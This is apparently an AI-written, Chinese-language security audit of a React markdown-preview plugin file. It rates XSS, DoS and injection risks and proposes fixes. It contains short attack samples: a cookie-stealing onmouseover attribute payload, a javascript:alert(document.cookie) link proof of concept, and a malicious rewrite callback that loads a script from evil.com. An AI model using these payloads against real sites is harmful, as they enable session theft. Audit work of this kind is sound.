# 代码安全专家评审报告：@uiw/react-markdown-preview/src/rehypePlugins.tsx

| 维度 | 评级 |
|------|------|
| **综合评分** | **REJECT — 3.5 / 10** |
| 输入校验 | ❌ 不合格（零校验，用户可控输入直达 DOM 属性） |
| XSS 防御 | ❌ 不合格（data-code 原始文本注入 HTML 属性，无编码） |
| 注入攻击 | ⚠️ 部分合格（属性展开保留上游属性，但当前路径无直接利用） |
| 拒绝服务 | ⚠️ 部分合格（代码块长度无上限，DOM 膨胀风险） |
| 认证/授权 | N/A（前端渲染组件，不涉及） |
| 依赖安全 | ⚠️ 部分合格（默认插件顺序隐式耦合，用户替换后安全逻辑静默失效） |
| 最小权限 | ❌ 不合格（用户 rewrite 回调拥有完整 AST 操控权，无沙箱） |
| 纵深防御 | ❌ 不合格（安全依赖 React 自动转义这一单层屏障，无独立防御） |

---

## 1. 文件概览

`rehypePlugins.tsx` 是 `@uiw/react-markdown-preview@5.2.0` 的 AST 重写行为工厂，负责：

1. **标题锚点链接增强** — 检测 `h1~h6` 标题中 `ariaHidden="true"` 的子元素，替换为 SVG 锚点图标
2. **代码块复制按钮注入** — 从 `<pre>` 提取代码文本，生成 `data-code` 属性的复制按钮元素
3. **默认插件清单导出** — `[rehype-slug, rehype-autolink-headings, rehype-ignore]`
4. **用户回调委托** — 调用用户提供的 `rewrite` 函数，传递完整 AST 访问权

完整源码（27 行）：

```typescript
import type { PluggableList } from 'unified';
import slug from 'rehype-slug';
import headings from 'rehype-autolink-headings';
import rehypeIgnore from 'rehype-ignore';
import { getCodeString, type RehypeRewriteOptions } from 'rehype-rewrite';
import type { Root, Element, RootContent } from 'hast';
import { octiconLink } from './nodes/octiconLink';
import { copyElement } from './nodes/copy';

export const rehypeRewriteHandle =
  (disableCopy: boolean, rewrite?: RehypeRewriteOptions['rewrite']) =>
  (node: Root | RootContent, index: number | null, parent: Root | Element | null) => {
    if (node.type === 'element' && parent && parent.type === 'root' && /h(1|2|3|4|5|6)/.test(node.tagName)) {
      const child = node.children && (node.children[0] as Element);
      if (child && child.properties && child.properties.ariaHidden === 'true') {
        child.properties = { class: 'anchor', ...child.properties };
        child.children = [octiconLink];
      }
    }
    if (node.type === 'element' && node.tagName === 'pre' && !disableCopy) {
      const code = getCodeString(node.children);
      node.children.push(copyElement(code));
    }
    rewrite && rewrite(node, index === null ? undefined : index, parent === null ? undefined : parent);
  };

export const defaultRehypePlugins: PluggableList = [slug, headings, rehypeIgnore];
```

---

## 2. 攻击面分析

### 威胁模型

```
攻击者 → Markdown 输入源（不可信）
              │
              ▼
     ┌─────────────────────────────────────────────────────┐
     │  remark 解析 + rehype 转换                            │
     │   ├── rehype-raw（允许原始 HTML）                     │
     │   ├── rehype-slug（添加 id）                          │
     │   ├── rehype-autolink-headings（添加锚链接）          │
     │   ├── rehype-ignore（忽略标记）                       │
     │   └── ★ rehypeRewriteHandle（本文件）                 │
     │        ├── 标题锚点图标注入（L13-18）                 │
     │        ├── 代码块复制按钮（L20-22）                   │
     │        │    └→ getCodeString → copyElement           │
     │        │       └→ data-code = 原始代码文本 ⚠️        │
     │        └── 用户 rewrite 回调（L24）                   │
     └─────────────────────────────────────────────────────┘
              │
              ▼
     ┌─────────────────────────────────────────────────────┐
     │  渲染层                                              │
     │   ├── React JSX（自动转义属性值）✅                  │
     │   └── rehype-stringify（不转义属性值）❌             │
     └─────────────────────────────────────────────────────┘
              │
              ▼
     ┌─────────────────────────────────────────────────────┐
     │  useCopied 交互层                                    │
     │   ├── target.dataset.code → DOMStringMap 自动解码   │
     │   ├── copyTextToClipboard(code) → 剪贴板写入        │
     │   └── MAX_COPY_LENGTH = 100,000 → 仅复制时限制      │
     └─────────────────────────────────────────────────────┘
```

---

## 3. 严重漏洞（CRITICAL / HIGH）

### SEC-01：`data-code` 属性注入 — HTML 属性截断导致 XSS（HIGH）

**CVSS 3.1 评分**: 6.1（Medium）— 在非 React 渲染路径下提升至 7.5（High）
**CWE**: CWE-79（跨站脚本）、CWE-123（写入不该写入的属性）
**OWASP**: A03:2021 – Injection

**位置**: `rehypePlugins.tsx:21` → `copy.ts:9`

**漏洞链路**:

```
攻击者 Markdown:
  ```javascript
  alert("hello")
  ```
           │
           ▼
  getCodeString(node.children) → 'alert("hello")'
           │
           ▼
  copyElement('alert("hello")')
           │
           ▼
  HAST Element:
    properties: { 'data-code': 'alert("hello")' }
           │
           ▼ [渲染路径分叉]
           │
     ┌─────┴──────────────────────────────┐
     ▼ React JSX 渲染                     ▼ rehype-stringify 序列化
     <div data-code='alert(&quot;hello&quot;)'>   <div data-code="alert("hello")">
     ✅ React 自动转义，安全              ❌ 属性值截断，XSS
                                         生成的 HTML:
                                         <div class="copied" data-code="alert("hello")"></div>
                                                                      ↑ 截断
                                         hello") 等文本成为 DOM 的一部分
                                         攻击者可构造 "onmouseover="alert(1)
                                         实现属性注入
```

**PoC（概念验证）— rehype-stringify 路径**:

```typescript
import { unified } from 'unified';
import remarkParse from 'remark-parse';
import remarkRehype from 'remark-rehype';
import rehypeStringify from 'rehype-stringify';
// ... 使用 rehypeRewriteHandle 处理含引号的代码块

// Markdown 输入:
// ```
// "onmouseover="alert(document.cookie)"
// ```

// 序列化结果:
// <div class="copied" data-code=""onmouseover="alert(document.cookie)""></div>
//                                              ↑ 属性截断
//                                    → onmouseover 事件处理器被注入
```

**利用条件**:

| 条件 | 本项目（by_geo）是否满足 | 说明 |
|---|---|---|
| Markdown 源来自不可信用户 | ✅ 满足 | 知识库/文章管理功能允许用户提交 Markdown |
| 使用 rehype-stringify 序列化 | ⚠️ 部分满足 | 当前使用 React JSX 渲染（安全），但 SSR 或邮件模板场景可能切换到 stringify |
| 攻击载荷含双引号 `"` | ✅ 满足 | 代码块中可自由输入任意字符 |

**当前缓解措施评估**:

| 缓解层 | 有效性 | 可靠性 |
|---|---|---|
| React JSX 自动转义 | ✅ 当前路径有效 | ❌ 仅在 React 渲染路径生效，非纵深防御 |
| `preview.tsx` 的 `allowElement` | ❌ 不过滤属性值 | — |
| `useCopied` 的 `MAX_COPY_LENGTH` | ❌ 仅限复制操作 | — |

**修复建议**:

```typescript
// 方案 A：在数据注入点编码（推荐 — 纵深防御）
function escapeHtmlAttr(str: string): string {
  return str.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

// rehypePlugins.tsx:21
const code = getCodeString(node.children);
node.children.push(copyElement(escapeHtmlAttr(code)));

// 方案 B：在 copyElement 内部编码（更安全 — 封装在产出模块中）
// copy.ts 修改
export function copyElement(str: string = ''): Element {
  return {
    properties: {
      'data-code': escapeHtmlAttr(str),  // 编码后再存储
    },
    // ...
  };
}
```

**备注**: 本项目（by_geo）当前使用 React 渲染路径，此漏洞在当前配置下**不可直接利用**，但属于潜在的 XSS 向量。如果未来引入 SSR 预渲染、邮件模板生成等场景，漏洞将变为可利用。

---

### SEC-02：属性展开保留上游不受信属性 — 潜在 DOM Clobbering / 事件注入（MEDIUM-HIGH）

**CWE**: CWE-79（跨站脚本）、CWE-94（代码注入）
**位置**: `rehypePlugins.tsx:16`

```typescript
child.properties = { class: 'anchor', ...child.properties };
//                                     ^^^^^^^^^^^^^^^^^^^^
//                                     展开保留上游所有属性
```

**漏洞分析**:

`rehypeRewriteHandle` 的标题锚点逻辑仅检测 `ariaHidden === 'true'`，然后**无条件展开保留 `child.properties` 中所有其他属性**。当与 `rehype-raw`（启用原始 HTML 解析）组合使用时：

```markdown
<!-- 攻击者 Markdown 输入 -->
## 标题

<!-- rehype-raw 会将原始 HTML 解析为 HAST -->
<a aria-hidden="true" onclick="alert(1)" href="javascript:alert(1)" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999">link</a>
```

**HAST 变换过程**:

```
输入 HAST（rehype-autolink-headings 产出前 — 此分析假设 raw HTML 产生含 ariaHidden 的元素）:

  <h2>
    <a aria-hidden="true" onclick="alert(1)" href="javascript:alert(1)">
      ...
    </a>
  </h2>

经过 rehypeRewriteHandle 处理后:

  child.properties = {
    class: 'anchor',                          // ← 新增
    ariaHidden: 'true',                       // ← 保留
    onclick: 'alert(1)',                      // ← 保留 ⚠️
    href: 'javascript:alert(1)',              // ← 保留 ⚠️
    style: 'position:fixed;...'               // ← 保留 ⚠️
  }
  child.children = [octiconLink];             // ← 替换内容为安全的 SVG
```

**利用可行性评估**:

| 因素 | 评估 |
|---|---|
| rehype-raw 是否启用 | ✅ 是（`index.tsx:18` 强制启用 `rehypeRaw`） |
| 攻击者能否控制 heading 子元素 | ⚠️ 间接 — 需要构造使 `rehype-autolink-headings` 产生含恶意属性的 `<a>` 子元素 |
| rehype-autolink-headings 是否允许攻击者控制属性 | ❌ 大部分属性由插件自身控制 |
| raw HTML 注入 heading 子元素 | ⚠️ 理论可行但受 markdown 解析限制 |

**实际风险**: 标准使用路径下**低概率可直接利用**，因为 `rehype-autolink-headings` 生成 `<a>` 元素的属性（`href`、`aria-hidden`）是插件控制的，非用户可控。但如果存在自定义 rehype 插件在 heading 内部注入元素，或 `rehype-raw` 的边界行为产生非预期 HAST 结构，属性展开会成为**攻击放大器**。

**修复建议**:

```typescript
// 白名单过滤 — 仅保留已知安全属性
const SAFE_ANCHOR_PROPS = ['class', 'ariaHidden', 'href'] as const;

if (child?.type === 'element' && child.properties?.ariaHidden === 'true') {
  const safeProps: Record<string, unknown> = { class: 'anchor' };
  for (const key of SAFE_ANCHOR_PROPS) {
    if (child.properties[key] !== undefined) {
      safeProps[key] = child.properties[key];
    }
  }
  child.properties = safeProps;
  child.children = [octiconLink];
}
```

---

### SEC-03：`getCodeString` 无长度限制 — DOM 膨胀导致拒绝服务（MEDIUM）

**CWE**: CWE-400（不受控制的资源消耗）
**位置**: `rehypePlugins.tsx:21`

```typescript
const code = getCodeString(node.children);  // 无长度限制
node.children.push(copyElement(code));       // 完整文本存入 DOM 属性
```

**攻击向量**:

```
攻击者 Markdown:
```（空代码块，但通过 rehype-raw 注入超大内容）
<pre><code>AAAAAA...（10MB 文本）...AAAAAA</code></pre>
```

**影响链路**:

```
getCodeString → 提取 10MB 文本
    ↓
copyElement(10MB string) → 生成 HAST 节点，data-code = 10MB
    ↓
React 渲染 → DOM 节点的 data-code 属性 = 10MB
    ↓
每个 <pre> 代码块 × 10MB × N 个代码块 = DOM 爆炸
    ↓
浏览器内存耗尽 → 标签页崩溃
```

**下游防护评估**:

| 防护层 | 位置 | 有效性 |
|---|---|---|
| `useCopied` MAX_COPY_LENGTH | `plugins/useCopied.tsx:5` | ❌ 仅限制**复制操作**，不限制**DOM 注入** |
| React 虚拟 DOM | 渲染层 | ❌ 无法限制 DOM 节点属性大小 |
| 浏览器 DOM 限制 | 运行时 | ⚠️ 视浏览器而定，通常 2-4GB 后崩溃 |

**修复建议**:

```typescript
const MAX_CODE_LENGTH = 100_000; // 与 useCopied 保持一致

if (node.type === 'element' && node.tagName === 'pre' && !disableCopy) {
  const code = getCodeString(node.children);
  if (code.length <= MAX_CODE_LENGTH) {
    node.children.push(copyElement(code));
  }
}
```

---

## 4. 中等安全问题（MEDIUM）

### SEC-04：正则表达式匹配不精确 — 安全逻辑绕过（MEDIUM）

**CWE**: CWE-185（正则表达式缺陷）
**位置**: `rehypePlugins.tsx:13`

```typescript
/h(1|2|3|4|5|6)/.test(node.tagName)
```

**安全影响**: 在 rehype-raw 启用的环境下，攻击者可通过 Markdown 注入任意 HTML 标签。如果攻击者构造 `<th1>` 或 `<thead>` 标签（包含 `h1`~`h6` 子串），会被错误匹配为标题元素，触发锚点图标注入逻辑。

虽然 `parent.type === 'root'` 的检查限制了只有直接子节点为标题时才触发，但在某些 HAST 结构中（如 `<table>` 内的 `<thead>` 作为根节点直接子元素），仍可能导致**非预期的 DOM 修改**。

**影响**: 功能异常（非预期标签被注入锚点图标），不直接导致安全漏洞，但可作为攻击链的中间步骤。

**修复**: 使用精确匹配 `/^h[1-6]$/`。

---

### SEC-05：用户 `rewrite` 回调无沙箱隔离 — 完整 AST 操控权（MEDIUM）

**CWE**: CWE-94（代码注入 — 委托模式）
**位置**: `rehypePlugins.tsx:24`

```typescript
rewrite && rewrite(node, index === null ? undefined : index, parent === null ? undefined : parent);
```

**安全分析**:

| 分析维度 | 评估 |
|---|---|
| 回调来源 | 用户通过 `props.rehypeRewrite` 传入 — 在 React 应用中通常来自组件树的父级 |
| 回调权限 | 完整读写访问整个 HAST 树（node、index、parent） |
| 隔离机制 | ❌ 无 — 回调可修改任意节点，可删除/替换安全检查节点的属性 |
| 异常处理 | ❌ 无 — 回调异常会导致整个 rehype 管线崩溃 |

**攻击场景**: 如果攻击者能控制 `rehypeRewrite` prop（例如通过 URL 参数 → 组件 props 注入），可传入恶意回调：

```typescript
// 恶意 rewrite 回调 — 移除所有安全过滤
rehypeRewrite: (node) => {
  if (node.type === 'element') {
    // 注入 <script> 标签
    if (node.tagName === 'body') {
      node.children.push({
        type: 'element',
        tagName: 'script',
        properties: { src: 'https://evil.com/xss.js' },
        children: []
      });
    }
    // 移除所有安全属性过滤
    if (node.properties?.className?.includes?.('safe')) {
      delete node.properties.className;
    }
  }
}
```

**实际风险**: 在标准使用模式下，`rehypeRewrite` 由开发者通过 JSX props 传入，攻击者通常无法控制。但如果存在**props 注入**漏洞（如将 URL 参数直接透传给组件 props），则可被利用。

**缓解建议**: 对用户回调添加 try-catch 异常边界，防止回调崩溃导致整个渲染失败：

```typescript
if (rewrite) {
  try {
    rewrite(node, index ?? undefined, parent ?? undefined);
  } catch (err) {
    if (typeof console !== 'undefined') {
      console.warn('[rehypeRewriteHandle] User rewrite callback error:', err);
    }
  }
}
```

---

### SEC-06：`defaultUrlTransform` 旁路禁用 URL 安全过滤 — 关联安全问题（MEDIUM）

**CWE**: CWE-79（跨站脚本 — `javascript:` URL）
**位置**: `preview.tsx:14`（非本文件，但与本文件同属一个安全域）

```typescript
// preview.tsx — 默认 URL 转换函数
const defaultUrlTransform: UrlTransform = (url) => url;
```

**安全影响**: `react-markdown` v9+ 默认使用安全 `urlTransform` 阻止 `javascript:` URL。但 `@uiw/react-markdown-preview` 将其覆盖为 `(url) => url`，**完全禁用 URL 安全过滤**。

**与本文件的关联**: `rehypeRewriteHandle` 的标题锚点逻辑（L13-18）保留了 `<a>` 标签的 `href` 属性（通过属性展开 SEC-02），而 `preview.tsx` 禁用了 URL 过滤。两者组合形成：

```
Markdown: [点击](javascript:alert(1))
    ↓
rehype 解析 → <a href="javascript:alert(1)">
    ↓
defaultUrlTransform → 不过滤，直接放行 ⚠️
    ↓
allowElement 检查 → tagName='a' 通过（符合 /^[A-Za-z0-9]+$/）✅
    ↓
XSS: 用户点击链接执行 javascript:alert(1)
```

**利用 PoC**:

```markdown
[点击执行脚本](javascript:alert(document.cookie))
```

**实际利用评估**: 本项目（by_geo）使用此库渲染用户提交的 Markdown，如果知识库/文章功能允许用户提交包含链接的 Markdown，攻击者可构造 `javascript:` URL，其他用户点击后执行任意 JavaScript。

**修复建议**: 在项目层面覆盖 `urlTransform`：

```tsx
<MarkdownPreview
  source={markdown}
  urlTransform={(url) => {
    // 阻止 javascript: / data: / vbscript: 等危险协议
    const safe = /^(https?|mailto|tel|ftp):/i.test(url) || url.startsWith('/') || url.startsWith('#');
    return safe ? url : '';
  }}
/>
```

---

## 5. 低危安全问题（LOW）

### SEC-07：`octiconLink` SVG 元素硬编码无完整性校验（LOW）

**CWE**: CWE-353（缺失完整性校验）
**位置**: `nodes/octiconLink.ts`

`octiconLink` 是一个硬编码的 HAST Element 常量，包含 SVG `<path>` 的 `d` 属性。虽然该值为常量不可被外部篡改，但在供应链攻击场景下（npm 包被替换），SVG 内容可能被注入恶意负载。

**评估**: 理论风险，实际利用依赖供应链攻击前置条件。

### SEC-08：`useCopied` 的 `dataset.code` 解码后无二次校验（LOW）

**CWE**: CWE-20（输入校验不当）
**位置**: `plugins/useCopied.tsx:19`

```typescript
const code = target.dataset.code;  // DOMStringMap 自动 HTML 实体解码
```

如果 SEC-01 的修复采用了 HTML 实体编码方案，`dataset.code` 读取时浏览器会自动解码回原始文本，`copyTextToClipboard(code)` 将解码后的原始文本写入剪贴板。这是正确行为，但需确保编码/解码对称。

---

## 6. 安全架构评估

### 防御层次分析

```
┌───────────────────────────────────────────────────────────────────┐
│                     安全防御层次图                                │
├───────────────────────────────────────────────────────────────────┤
│                                                                   │
│  Layer 4: 渲染层（preview.tsx）                                   │
│  ├── allowElement: /^[A-Za-z0-9]+$/.test(tagName)               │
│  │   └→ 过滤标签名，但不过滤属性和属性值 ❌                       │
│  ├── urlTransform: (url) => url                                  │
│  │   └→ 禁用了 react-markdown 的默认安全过滤 ❌                  │
│  └── skipHtml: true（默认）                                      │
│      └→ 但 index.tsx 强制启用 rehypeRaw，绕过此限制 ❌           │
│                                                                   │
│  Layer 3: AST 重写层（rehypePlugins.tsx）← ★ 本文件 ★            │
│  ├── 标题锚点: 展开保留上游属性 ❌                                │
│  ├── 复制按钮: data-code 无编码 ❌                                │
│  └── 用户回调: 无沙箱无异常边界 ❌                                │
│                                                                   │
│  Layer 2: 插件管线层（index.tsx）                                 │
│  ├── rehypeRaw: 启用原始 HTML → 扩大攻击面 ⚠️                   │
│  ├── rehypeAttrs: 属性注入 → 可能引入额外属性 ⚠️                 │
│  └── pluginsFilter: 允许用户修改插件列表 ❌                      │
│                                                                   │
│  Layer 1: 解析层（react-markdown / remark / rehype）              │
│  └── 标准 Markdown 解析 + HTML 原始解析                          │
│                                                                   │
│  Layer 0: React 渲染引擎                                          │
│  └── JSX 自动转义 → 当前唯一有效安全屏障 ⚠️                     │
│      （仅保护 React 渲染路径，不保护 stringify 路径）             │
│                                                                   │
├───────────────────────────────────────────────────────────────────┤
│  结论: 安全仅依赖 Layer 0（React 自动转义）这单一屏障            │
│        所有上层防御层均存在缺陷或被主动禁用                       │
│        违反纵深防御（Defense in Depth）原则                       │
└───────────────────────────────────────────────────────────────────┘
```

---

## 7. 对本项目（by_geo）的影响评估

### 7.1 攻击场景矩阵

| 攻击场景 | 前置条件 | 利用难度 | 影响范围 | 当前可利用 |
|---|---|---|---|---|
| `javascript:` URL XSS | 用户可提交含链接的 Markdown | 低 | 窃取 cookie/会话 token | ⚠️ 可能 |
| `data-code` 属性注入 | React 切换到 stringify 渲染 | 高 | XSS | ❌ 当前不可 |
| DOM 膨胀 DoS | 用户可提交含超大代码块的 Markdown | 低 | 浏览器崩溃 | ✅ 可以 |
| DOM Clobbering | 自定义 rehype 插件冲突 | 高 | 功能异常 | ❌ 低概率 |
| Props 注入 | URL 参数透传到组件 props | 中 | 完整 AST 操控 | ⚠️ 需审计 |

### 7.2 当前使用方式

```typescript
// index.tsx 中的消费方式
const rehypePlugins = [
  reservedMeta,
  rehypeRaw,              // ← 启用原始 HTML，扩大攻击面
  retrieveMeta,
  ...defaultRehypePlugins, // ← slug + headings + ignore
  [rehypeRewrite, {
    rewrite: rehypeRewriteHandle(
      props.disableCopy ?? false,
      props.rehypeRewrite
    )
  }],
  [rehypeAttrs, { properties: 'attr' }],
  ...(props.rehypePlugins || []),
  [rehypePrism, { ignoreMissing: true }],
];
```

### 7.3 紧急修复建议（项目层面）

**优先级排序**:

| 优先级 | 修复项 | 工作量 | 说明 |
|---|---|---|---|
| **P0** | 覆盖 `urlTransform` 阻止 `javascript:` URL | 5 行 | 阻止 SEC-06 最直接可利用的攻击 |
| **P0** | 审计 MarkdownViewer 组件的 props 来源 | 2h | 确认无 URL 参数透传到 `rehypeRewrite` |
| **P1** | 在 MarkdownViewer 封装层添加 DOMPurify 后处理 | 10 行 | 为 data-code 和属性注入提供独立防御层 |
| **P1** | 添加代码块长度限制（前置拦截） | 5 行 | 阻止 SEC-03 DoS 攻击 |
| **P2** | 锁定 `@uiw/react-markdown-preview` 和 rehype 插件版本 | 2 行 | 防止供应链风险和隐式契约被打破 |

---

## 8. 合规性检查

| 标准 | 要求 | 合规状态 |
|---|---|---|
| OWASP Top 10 A03:2021 Injection | 用户输入在输出前必须编码/转义 | ❌ `data-code` 未编码 |
| OWASP Top 10 A04:2021 Insecure Design | 纵深防御原则 | ❌ 仅依赖 React 单层屏障 |
| OWASP ASVS 5.2.1 | 输出编码与注入防护 | ❌ 属性值无编码 |
| OWASP ASVS 5.2.4 | URL 重定向和请求伪造 | ❌ `javascript:` URL 未过滤 |
| CWE-79 XSS Prevention | 不将不可信数据插入 HTML 属性 | ❌ 原始文本直达 `data-code` |
| CWE-400 DoS Prevention | 限制用户输入大小 | ❌ 代码块无长度限制 |

---

## 9. 改进建议汇总

| 编号 | 严重度 | 类别 | 描述 | 修复工作量 | 本项目修复位置 |
|---|---|---|---|---|---|
| SEC-01 | HIGH | XSS | `data-code` 属性未编码，HTML 序列化路径可被属性注入 | 5 行 | MarkdownViewer 封装层 + DOMPurify |
| SEC-02 | MEDIUM-HIGH | 注入 | 属性展开保留上游不受信属性，DOM Clobbering 风险 | 10 行 | 需修改 node_modules（不可行） |
| SEC-03 | MEDIUM | DoS | 代码块无长度限制，DOM 膨胀可导致浏览器崩溃 | 5 行 | MarkdownViewer 前置校验 |
| SEC-04 | MEDIUM | 绕过 | 正则未锚定，可绕过标题检测安全逻辑 | 1 行 | 需修改 node_modules（不可行） |
| SEC-05 | MEDIUM | 注入 | 用户 rewrite 回调无沙箱/无异常边界 | 8 行 | 需修改 node_modules（不可行） |
| SEC-06 | MEDIUM | XSS | `defaultUrlTransform` 禁用 URL 安全过滤 | 5 行 | **本项目 MarkdownViewer 即可修复** |
| SEC-07 | LOW | 供应链 | SVG 常量无完整性校验 | — | 锁定版本 |
| SEC-08 | LOW | 校验 | dataset.code 解码后无二次校验 | — | 与 SEC-01 一起修复 |

---

## 10. 评审总结

`rehypePlugins.tsx` 作为 `@uiw/react-markdown-preview` 的核心 AST 转换模块，在**功能实现**上精简高效，但在**安全防御**上存在系统性缺陷：

**核心安全问题**：安全仅依赖 React JSX 渲染引擎的自动转义这一**单一屏障**。所有上层防御层（输入校验、属性编码、URL 过滤、输出编码）均为空缺或被主动禁用。这违反了**纵深防御**（Defense in Depth）的基本原则。

**最严重风险**：
1. `data-code` 属性存储未编码的用户输入（SEC-01）— 在非 React 渲染路径下可直接导致 XSS
2. `defaultUrlTransform` 禁用 URL 安全过滤（SEC-06）— 在当前 React 渲染路径下也可被利用，用户点击 `javascript:` 链接即可触发脚本执行
3. 代码块无长度限制（SEC-03）— 可直接被利用进行 DoS 攻击

**综合评分 3.5/10** — 在攻击面管理、输入校验、输出编码、纵深防御四个核心安全维度均不达标。考虑到本项目通过 MarkdownViewer 封装层可以缓解大部分风险（覆盖 `urlTransform`、添加 DOMPurify、限制代码块长度），建议在项目层面实施上述紧急修复建议后，风险可降低至可接受水平。

---

*评审人: 代码安全专家 (Claude)*
*评审方法: 威胁建模 + 攻击面分析 + 漏洞链路追踪 + CWE/OWASP 合规映射 + 依赖链安全审计*
*评审日期: 2026-05-24*
